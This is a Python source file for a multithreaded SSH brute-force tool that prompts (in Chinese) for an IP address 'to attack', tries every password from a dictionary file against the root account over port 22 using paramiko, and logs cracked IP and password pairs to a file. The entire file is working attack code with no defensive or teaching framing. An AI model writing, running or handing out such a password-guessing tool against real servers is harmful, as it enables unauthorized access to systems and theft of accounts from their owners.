import os
import paramiko
import sys
import threading
import time


class SSHThread(threading.Thread):
    def __init__(self, ip, port, timeout, dic, LogFile):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.dict = dic
        self.timeout = timeout
        self.LogFile = LogFile

    def run(self):
        print("Start try ssh => %s" % self.ip)
        username = "root"
        try:
            password = open(self.dict).read().split('\n')
        except:
            print("Open dict file `%s` error" % self.dict)
            exit(1)
        for pwd in password:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.ip, self.port, username, pwd, timeout=self.timeout)
                print("\nIP => %s, Login %s => %s \n" % (self.ip, username, pwd))
                open(self.LogFile, "a").write("[ %s ] IP => %s, port => %d, %s => %s \n" % (
                    time.asctime(time.localtime(time.time())), self.ip, self.port, username, pwd))
                break
            except:
                print("IP => %s, Error %s => %s" % (self.ip, username, pwd))
                pass


def ViolenceSSH(ip, port, timeout, dic, LogFile):
    ssh_scan = SSHThread(ip, port, timeout, dic, LogFile)
    ssh_scan.start()


def main(ip, dic, log):
    threading.Thread(target=ViolenceSSH, args=(ip, 22, 1, dic, log,)).start()


def help():
    print("python ssh.scan.py :\n\
        修改dict下的ip文件，password按需求修改，然后执行脚本。 \n")
    exit(1)


def begin():
    fpath = os.path.dirname(os.path.abspath('__file__'))
    ip = input("请输入攻击的ip地址")
    dic = sys.argv[2] if len(sys.argv) > 2 else fpath + "\密码库.txt"
    log = sys.argv[3] if len(sys.argv) > 3 else fpath + "\配对成功的ip密码.txt"
    try:
        os.system("clear")
        main(ip, dic, log)
    except KeyboardInterrupt:
        exit(1)
